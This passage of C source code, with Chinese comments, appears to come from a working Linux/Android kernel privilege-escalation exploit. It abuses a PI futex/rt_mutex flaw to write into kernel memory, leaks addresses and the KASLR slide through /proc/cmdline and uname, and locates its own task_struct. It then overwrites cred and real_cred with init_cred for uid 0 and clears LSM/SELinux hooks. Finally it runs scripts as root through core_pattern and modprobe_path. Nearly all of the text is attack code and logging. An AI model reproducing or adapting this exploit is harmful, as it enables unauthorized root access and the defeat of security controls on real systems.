              ok ? "★★★ **主观 cred 已是 init_cred ⇒ uid0 + 全 caps**(还差 real_cred 那一栏)"
                 : (wu == 2000 || wu == -1 ? "还是基线 ⇒ 没落(再打)"
                                           : "停在预言残渣值 ⇒ 补刀那发没落(再打)"));
        } else if (phase == 5) {
          /* 相5 = 同一份 cred 写进 `real_cred` 槽: 判据 = main 读 `/proc/<W_tid>/status` 的
           * Uid 第一栏(取 real_cred)又变回那个预言值(因为这一发的配对写又弄脏了 uid ⇒ 相6 再补)。 */
          int tu[4], tg[4];
          int rc = task_ids(VICTIM ? v_tid : (USEMAIN ? (int)getpid() : p_tid), tu, tg);
          int pred = (int)(uint32_t)(((USEMAIN ? MTASK : TASK) + TASK_RCRD_OFF) >> 32);
          ok = (rc == 0 && tu[0] == pred);
          say("[SEN] 相5(写 task+0x840 = %016lx): /proc/%d/status Uid=%d,%d,%d,%d Gid=%d,%d,%d,%d"
              " (rc=%d) 预言 real=%d ⇒ %s\n", (unsigned long)ICRED, p_tid,
              tu[0], tu[1], tu[2], tu[3], tg[0], tg[1], tg[2], tg[3], rc, pred,
              ok ? "★★★ 客观槽也接上了同一份 cred(再补一发把 uid 擦回 0)" : "real 栏没到预言值 ⇒ 没落(再打)");
        } else {
          /* 相6 = 第二次补刀: 又一行纯零写 *(IC+4)=0 ⇒ 主观+客观两边 uid/gid 全 0。
           * 判据 = W 自报 与 /proc 两边的 uid/gid **八栏全部** 归 0。 */
          int wu, we;
          if (VICTIM) {
            for (int k = 0; k < 4000 && __atomic_load_n(&v_seq, __ATOMIC_ACQUIRE) == vseq0; k++)
              usleep(100);
            wu = __atomic_load_n(&v_uid, __ATOMIC_ACQUIRE);
            we = __atomic_load_n(&v_euid, __ATOMIC_ACQUIRE);
          } else if (USEMAIN) {          /* 被换 cred 的是 main 自己 ⇒ 直接读自己的 uid */
            wu = (int)getuid(); we = (int)geteuid();
          } else {
            for (int k = 0; k < 4000 && __atomic_load_n(&w_seq, __ATOMIC_ACQUIRE) == wseq0; k++)
              usleep(100);
            wu = __atomic_load_n(&w_uid, __ATOMIC_ACQUIRE);
            we = __atomic_load_n(&w_euid, __ATOMIC_ACQUIRE);
          }
          int tu[4], tg[4];
          int rc = task_ids(VICTIM ? v_tid : (USEMAIN ? (int)getpid() : p_tid), tu, tg);
          ok = (wu == 0 && we == 0 && rc == 0 &&
                tu[0] == 0 && tu[1] == 0 && tu[2] == 0 && tu[3] == 0 &&
                tg[0] == 0 && tg[1] == 0 && tg[2] == 0 && tg[3] == 0);
          say("[SEN] 相6(第二次纯零写 *(%016lx+4)=0): W 自报 uid=%d euid=%d | /proc/%d"
              " Uid=%d,%d,%d,%d Gid=%d,%d,%d,%d (rc=%d) ⇒ %s\n",
              (unsigned long)ICRED, wu, we, p_tid,
              tu[0], tu[1], tu[2], tu[3], tg[0], tg[1], tg[2], tg[3], rc,
              ok ? "★★★ W 整个人 = uid0 + gid0 + init_cred 的全 caps" : "还没全归 0 ⇒ 看哪一栏没动");
        }
        if (ok) {
          wrote = 1;
          if (phase == 4) {
            /* 主观 root 已经在手(getuid()=0/euid=0) ⇒ 继续把 real_cred 也接上(相5)+再补一刀
             * 清 uid(相6)。这两发的判据都是 main 直接从 /proc 读(不需要 W 自报)。 */
            senfail = 0;
            say("[SEN] ★★★ 两发拿到主观 root ⇒ 接着打相5(real_cred)+相6(补刀), 让 /proc 的 real 栏也归 0\n");
            phase++; rounds = 0;
            __atomic_store_n(&h_phase, phase, __ATOMIC_RELEASE);
            continue;
          }
          if (phase == 6) {
            senfail = 0;
            say("[SEN] ★★★ 四发全部按预言落地(主观+客观都归位) ⇒ 相7 举证 + 开一条可用的 root 通道\n");
            phase = 7; rounds = 0;
            __atomic_store_n(&h_phase, 7, __ATOMIC_RELEASE);
            continue;
          }
          phase++; rounds = 0;
          __atomic_store_n(&h_phase, phase, __ATOMIC_RELEASE);
          continue;
        }
        if (rounds >= 8) {
          senfail = phase;
          say("[SEN] × 相%d 连打 %d 发没能生效 ⇒ **停在这里**(不带着脏状态往下走)\n", phase, rounds);
          break;
        }
        continue;
      }
      if (phase == 1) {                          /* 控制相 */
        double la = read_load0();
        int landed = (la > 1e6);
        say("[CTRL] 相1 之后 /proc/loadavg 第一列 = %.2f ⇒ %s\n", la,
            landed ? "★★★ **.bss 写确实生效**(那两发 selinux_state 的重启也就是内容后果)"
                   : "× .bss 目的没生效 ⇒ 读通道必须换 .data 里的载体, 别再试 saved_command_line");
        if (landed) { hit = 1; if (!next_round(&phase, &rounds)) break; continue; }
        if (rounds >= 8) break;
        continue;
      }
      if (phase >= 2 && phase <= 9) {
        unsigned char rb[512];
        char rh[3 * 512];
        ssize_t rl = read_cmdline(rb, sizeof rb);
        hexbuf(rh, sizeof rh, rb, rl > 0 ? rl : 0);
        uintptr_t want = LK_SAVED_CMDLINE + SLIDE - 8;
        uintptr_t back = rl >= 8 ? hexq(rh, 0) : 0;
        uintptr_t waddr = phase == 2 ? (LK_INIT_UTS + SLIDE + 0x24)
                    : phase == 3 ? (h_S + 0x100) : (h_S + RD_OFF[phase - 4]);
        say("[RD] 相%d 窗口=%016lx len=%zd 前8=%016lx %s\n", phase,
            (unsigned long)waddr, rl, (unsigned long)back,
            back == want ? "★=预期的 pc ⇒ 这一发落了" : "(不是 pc ⇒ 这一发没落/还没生效)");
        if (rl > 0) say("[RD] 原样 hex: %s\n", rh);
        if (phase == 3 && back == want && rl >= 15 && !memcmp(rb + 8, "A1CDEFG", 7))
          say("[RD] ★★★ 读通道成立 + 带内地址算得准 + slide 对(标记 'A1CDEFG' 原样读回)★★★\n");
        if (back == want) {
          hit = 1;
          note_candidates(rh, rl);               /* 从这一段死帧里挑"像 task"的核指针 */
          if (phase == 9) {                      /* 八窗扫完 ⇒ 进验真相 */
            if (!ncand) { say("× 八窗里没有任何候选 ⇒ 收工(不盲写)\n"); break; }
            ci_now = 0; h_cand = CAND[0];
            say("[CAND] 共 %d 个候选 ⇒ 相10 逐个验真(看 +0x68 是否 == S&~0x3fff)\n", ncand);
            phase = 10; rounds = 0;
            __atomic_store_n(&h_phase, 10, __ATOMIC_RELEASE);
            continue;
          }
          if (phase >= NPH) break;
          if (!next_round(&phase, &rounds)) break;
          continue;
        }
        if (rounds >= 6) {
          if (phase == 2) {                      /* .data 起点也不行 ⇒ 这个变量本身写不动 */
            say("× 相2 连打 6 发都没能改到 saved_command_line ⇒ **该变量在此构建不可用作读载体**"
                "(不是'起点在栈'的问题) ⇒ 换载体或改走 cmdline 之外的打印指针\n");
            break;
          }
          say("× 相%d 连打 %d 发, /proc/cmdline 前 8 字节都不是 pc ⇒ 这一窗读不到 ⇒ 跳过它继续\n",
              phase, rounds);
          if (!next_round(&phase, &rounds)) break;
          continue;
        }
        continue;
      }
      if (phase == 10) {                         /* 验真: cand+0x60 那窗里 offset 16 应当是栈基址 */
        unsigned char rb[512];
        char rh[3 * 512];
        ssize_t rl = read_cmdline(rb, sizeof rb);
        hexbuf(rh, sizeof rh, rb, rl > 0 ? rl : 0);
        uintptr_t want = LK_SAVED_CMDLINE + SLIDE - 8;
        uintptr_t back = rl >= 8 ? hexq(rh, 0) : 0;
        uintptr_t stackv = rl >= 24 ? hexq(rh, 16) : 0;   /* [0..7]=pc [8..15]=cand+0x60 [16..23]=cand+0x68 */
        uintptr_t base = h_S & STACK_MASK;
        uintptr_t cd = h_cand;
        say("[VER] 候选#%d %016lx: 前8=%016lx%s cand+0x68=%016lx 期望栈基=%016lx\n",
            ci_now + 1, (unsigned long)cd, (unsigned long)back, back == want ? "(pc ✔)" : "(✗)",
            (unsigned long)stackv, (unsigned long)base);
        if (rl > 0) say("[VER] 原样 hex: %s\n", rh);
        if (back == want && (stackv == base || (stackv && base && (stackv & STACK_MASK) == base))) {
          TASK = cd;
          say("[VER] ★★★ 候选 %016lx 的 +0x68 就是 W 自己的栈基址 ⇒ **这是 W 的 task_struct** ✔\n",
              (unsigned long)cd);
          phase = 11; rounds = 0;                /* 直接进提权相(cred / real_cred 两笔) */
          __atomic_store_n(&h_phase, 11, __ATOMIC_RELEASE);
          say("[R] === 验真通过 ⇒ 进相 11(task->cred ← init_cred) ===\n");
          continue;
        }
        if (back != want && rounds >= 6) { say("× 相10 读不通 ⇒ 收工\n"); break; }
        if (++ci_now >= ncand) { say("× %d 个候选没有一个通过验真 ⇒ **收工(绝不盲写 cred)**\n", ncand); break; }
        h_cand = CAND[ci_now]; rounds = 0;
        say("[VER] 换下一个候选 #%d = %016lx\n", ci_now + 1, (unsigned long)CAND[ci_now]);
        continue;
      }
      if (phase >= 11) {                        /* cred/real_cred: 纯写, 无判据 */
        if (rounds >= KID_SHOTS) {
          say("[W] 相%d 纯写已打 %d 发 ⇒ 前进\n", phase, rounds);
          wrote = 1;
          if (phase == 12) {                    /* 两笔 cred 写完 ⇒ 直接进举证相(别再回验真) */
            phase = 13; rounds = 0;
            __atomic_store_n(&h_phase, 13, __ATOMIC_RELEASE);
            say("[R] === cred 两笔打完 ⇒ 相13: 由 W 亲自 fork 孩子举证 uid ===\n");
            continue;
          }
          if (phase >= NPH) break;
          if (!next_round(&phase, &rounds)) break;
          continue;
        }
        continue;
      }
      if (phase > NSP + 1 && rounds > 12 && 0) {
        /* (旧的空转规则, 现由上面"相5/相6/相7"各自的发数额度取代) */
        say("[W] 相%d 是纯写(无判据), 已打 %d 发 ⇒ 前进\n", phase, rounds);
        if (phase >= NPH) break;
        if (!next_round(&phase, &rounds)) break;
        continue;
      }
      if (rounds > ROUNDS_MAX) {
        say("× 相%d 打了 %d 发判据没动 ⇒ 跳到下一相(两相读到同样字节时判据本来不会动)\n", phase, rounds);
        if (phase >= NPH) break;
        if (!next_round(&phase, &rounds)) break;
        continue;
      }
      if ((tries % 2000) == 0) say("[H] %ld 次未中(还没炸就说明每次读到的都是残渣里的早退)\n", tries);
    }
    h_stop = 1;
    stop_all = 1;
    obs_stop = 1;
    usleep(300000);
    read_sysname(cur, sizeof cur);
    say("[H] 结束 tries=%ld hit=%d wrote=%d TASK=%016lx 最终 sysname=%s\n",
        tries, hit, wrote, (unsigned long)TASK, cur);
    if (SENOFF) {
      /* 把"停在哪一相"记到设备上, 下一轮开机后据此决定还要不要重打那个布尔。 */
      char sb[32];
      int n = snprintf(sb, sizeof sb, "%d\n", senfail);
      if (senfail == 0) unlink(SEN_STATE_FILE);          /* 走完 ⇒ 不留辅助文件 */
      else if (put_file(SEN_STATE_FILE, sb, (size_t)n, 0644))
        say("[SEN] × 状态文件写不下去 errno=%d(%s)\n", errno, strerror(errno));
      else say("[SEN] 已记录 senfail=%d 到 %s\n", senfail, SEN_STATE_FILE);
      {   /* 收尾必查: 举证用的 helper 文件是否已经删干净(临时 root, 不留持久化) */
        int q[3] = { 0, 0, 0 };
        const char *res[3] = { EH_PATH, EH_TRIG, EH_LOG };
        for (int i = 0; i < 3; i++) {
          struct stat st;
          if (stat(res[i], &st) == 0) { unlink(res[i]); q[i] = 1; }
        }
        say("[SEN] 收尾清理: %s%s%s%s\n", q[0] ? "删了 ghost_eh " : "", q[1] ? "删了 ghost_trig " : "",
            q[2] ? "删了 ghost_root.log " : "", (q[0] | q[1] | q[2]) ? "" : "(无残留 helper 文件)");
        char ob[256];
        if (sysctl_read("/proc/sys/kernel/core_pattern", ob, sizeof ob) == 0 && ob[0] == '|')
          say("[SEN] × core_pattern 还指着管道 helper ⇒ 立刻复原它\n"),
              put_file("/proc/sys/kernel/core_pattern", "core\n", 5, -1);
      }
    }
    /* ★ 提权写打过 ⇒ 现在 fork 出来的孩子继承的就是被改过的 cred(这才是"临时 root"的证据)。
     *   旧顺序(写之前 clone、指望 rb_next 把最新 task 漏出来)随读通道一起废掉。 */
    if (KIDS && wrote && !(SENOFF && TASK)) { kid_new(); kid_new(); usleep(120000); }
    if (KIDS) {
      say("[k] 收尾: 共 %d 个孩子挂起; TASK=%016lx enforce='%c' ⇒ 放它们去 exec\n",
          nkid, (unsigned long)TASK, read_enforce() > 0 ? (char)read_enforce() : '?');
      kids_release_and_read();
    }
    if (XROOT && (!SENOFF || senfail == 0)) {
      /* 收口: 让内核自己以 uid 0 执行我们的脚本(core_pattern 管道 helper / modprobe_path)
       * ⇒ 前提就是相1..3 那三笔"清 LSM 钩子链头"的零写。用完自动复原 sysctl + 删脚本。 */
      say("[X] 进 root 收口(core_pattern / modprobe_path 两把触发)\n");
      fflush(stderr);
      try_root_triggers();
    }
    if (!hit) say("× hammer 一次都没命中(一次都没炸?)\n");
    else say("★ 写落地了: 覆盖层在被打的瞬间确实是活的\n");
    say("[DONE] 全流程结束(没炸)\n");
    return hit ? 0 : 3;
  }
  for (int i = 0; i < 50 && !st_payload; i++) usleep(100000);
  if (!st_payload) { say("[-] 载荷没放下\n"); return 1; }
  long pre_prio = read_prio(p_tid);
  say("[*] 载荷已放置(tid=%d), punch! 打之前实测 W 的 prio=%ld\n", p_tid, pre_prio);

  struct sched_attr_t a;
  memset(&a, 0, sizeof a);
  a.size = sizeof a;
  a.sched_policy = 0;                 /* SCHED_OTHER */
  a.sched_nice = 19;
  errno = 0;
  long pr = syscall(SYS_sched_setattr, (pid_t)p_tid, &a, 0);
  st_punch_ret = (int)pr; st_punch_errno = errno;
  say("[R] sched_setattr(tid=%d, nice=19) ret=%ld errno=%d\n", p_tid, pr, errno);
  /* 打完之后 W 的 prio = rt_effective_prio(p, 139) —— 这就是 rt_mutex_adjust_pi
   * 里 `ldr w9,[task,#0xb4]` 读到的那一个(存活时才读得到, 本身就是"活到了这里"的证据)。 */
  say("[R] 打完之后实测 W 的 prio=%ld\n", read_prio(p_tid));
  say("[M1] punch 已返回 ret=%d errno=%d\n", st_punch_ret, st_punch_errno);
  st_punch_done = 1;
  usleep(200000);
  obs_stop = 1;
  stop_all = 1;
  usleep(200000);

  read_sysname(name_hex_after, sizeof name_hex_after);
  {
    struct utsname u;
    if (uname(&u) == 0) {
      say("[+] 之后 sysname 前 12 字节 = [%.12s]\n", u.sysname);
      say("[+] 之后 sysname hex(前40字节) = %s\n", name_hex_after);
    }
    uintptr_t S = leaked_stack(name_hex_after);
    if (S) {
      say("[+] 泄漏: 受害者内核栈上 waiter 的真实地址 S = %016lx\n", (unsigned long)S);
      say("[+] 可控载荷窗口 = [%016lx, %016lx) (S-0x88 .. S+0x188, 共 0x210)\n",
          (unsigned long)(S - 0x88), (unsigned long)(S + 0x188));
    }
  }
  say("%s\n", strcmp(name_hex_before, name_hex_after) ? "★ 写落地了(任意 4 对齐 8 字节写成立)"
                                                      : "× sysname 未变: 链走没走到 rb 摘除");
  fx(C, FUNLOCKPI, (int)syscall(SYS_gettid), NULL, NULL, 0);
  say("[DONE] 全流程结束(没炸)\n");
  return 0;
}
